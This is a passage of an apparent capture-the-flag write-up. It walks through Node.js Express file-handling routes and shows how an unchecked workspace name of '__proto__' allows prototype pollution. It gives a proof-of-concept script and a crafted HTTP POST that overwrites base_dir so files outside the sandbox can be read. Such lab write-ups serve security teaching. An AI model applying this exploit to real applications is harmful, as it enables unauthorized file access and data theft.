        <span class="kd">const</span> <span class="nx">f_content</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_content</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid id or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span> <span class="o">||</span> <span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name or path</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">write_b64_file</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">),</span> <span class="nx">f_content</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>

        
        <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f_path</span><span class="p">;</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
    <span class="p">});</span>

    <span class="nx">app</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_name</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">workspace</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find file</span><span class="dl">"</span><span class="p">});</span>

        <span class="nx">fs</span><span class="p">.</span><span class="nf">rmSync</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">),</span> <span class="p">{</span><span class="na">recursive</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
        <span class="k">delete</span> <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">];</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
    <span class="p">});</span>

    <span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws/:fname</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">fname</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>
       
        <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">];</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find file</span><span class="dl">"</span><span class="p">});</span>
        
        <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nf">read_b64_file</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">content</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>

        <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">file_content</span><span class="p">:</span> <span class="nx">content</span><span class="p">});</span>
    <span class="p">});</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">file.js</code> is important that solve this challenge. <code class="language-plaintext highlighter-rouge">file.js</code> has a function to print the workspace of user and creat, delete a file and read the file it created. But when we see the function of reading the file, it take the value of <code class="language-plaintext highlighter-rouge">f_name</code> from <code class="language-plaintext highlighter-rouge">workspace</code> object and use it as the path of file. So If we modify the value of <code class="language-plaintext highlighter-rouge">f_name</code> to flag path, we can read a flag.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_name</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_path</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\.</span><span class="sr">/g</span><span class="p">,</span><span class="dl">''</span><span class="p">)</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">f_content</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_content</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid id or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span> <span class="o">||</span> <span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name or path</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">write_b64_file</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">),</span> <span class="nx">f_content</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>

        
        <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f_path</span><span class="p">;</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
    <span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the value of <code class="language-plaintext highlighter-rouge">f_path</code> was defined in logic of creating a file. it put the path value into f_name value of <code class="language-plaintext highlighter-rouge">workspace</code>. But in the if statement, if workspace of user is not defined, error occurs but we can create it that we request to <code class="language-plaintext highlighter-rouge">/api/users/:userid</code> as POST. And even if we created, <code class="language-plaintext highlighter-rouge">base_dir</code> is <code class="language-plaintext highlighter-rouge">/tmp/*</code> and the value <code class="language-plaintext highlighter-rouge">f_path</code> remove <code class="language-plaintext highlighter-rouge">.</code> chars using replace() method so we can’t go to up. So we can’t escape from base_dir using this function.</p>

<p>But <code class="language-plaintext highlighter-rouge">Prototype Pollution</code> occur when we make or read or delete a file. So I used it. it call several if statement after getting the value of several parameter. Here, important thing is way for calling object of users.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>1. const user = users[userid];
2. const workspace = user.workspaces[ws_name];
3. workspace[f_name] = f_path;
</pre></td></tr></tbody></table></code></div></div>
<p>Call all object of users as above. But here, we can use prototype pollution because be not checking the value <code class="language-plaintext highlighter-rouge">ws_name</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>1. const workspace = user.workspaces[__proto__];
2. workspace[f_name] = f_path;
</pre></td></tr></tbody></table></code></div></div>
<p>If the value of <code class="language-plaintext highlighter-rouge">ws_name</code> is <code class="language-plaintext highlighter-rouge">__proto__</code>, in second part workspace will be prototype object because the result value is prototype object. then we can pollute internal property to <code class="language-plaintext highlighter-rouge">f_path</code> using the <code class="language-plaintext highlighter-rouge">f_name</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nx">users</span><span class="p">[</span><span class="dl">'</span><span class="s1">asdf</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
            <span class="na">userid</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">asdf</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">pass</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">asdf</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">workspaces</span> <span class="p">:</span> <span class="p">{</span><span class="dl">'</span><span class="s1">asdf</span><span class="dl">'</span><span class="p">:{}},</span>
            <span class="na">base_dir</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/tmp/a/nss</span><span class="dl">'</span>
        <span class="p">};</span>
<span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="dl">'</span><span class="s1">asdf</span><span class="dl">'</span><span class="p">]</span>
<span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="dl">'</span><span class="s1">__proto__</span><span class="dl">'</span><span class="p">];</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">workspace</span><span class="p">)</span>
<span class="nx">workspace</span><span class="p">[</span><span class="dl">'</span><span class="s1">asdf</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">polluted</span><span class="dl">'</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">asdf</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>❯ node poc.js
<span class="o">[</span>Object: null prototype] <span class="o">{}</span>
polluted
</pre></td></tr></tbody></table></code></div></div>
<p>So, <code class="language-plaintext highlighter-rouge">Prototype Pollution</code> occur as above.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/api/users/asdf/__proto__</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8888</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">97</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

<span class="p">{</span><span class="w">
    </span><span class="nl">"token"</span><span class="p">:</span><span class="s2">"b168dbf118c3ee0fe6db7a3d576694b5e11dfae1"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"file_name"</span><span class="p">:</span><span class="s2">"base_dir"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"file_path"</span><span class="p">:</span><span class="s2">"/usr/src/app"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<p>After creating a user, if we request as above, we can pollute the value what we want to <code class="language-plaintext highlighter-rouge">base_dir</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
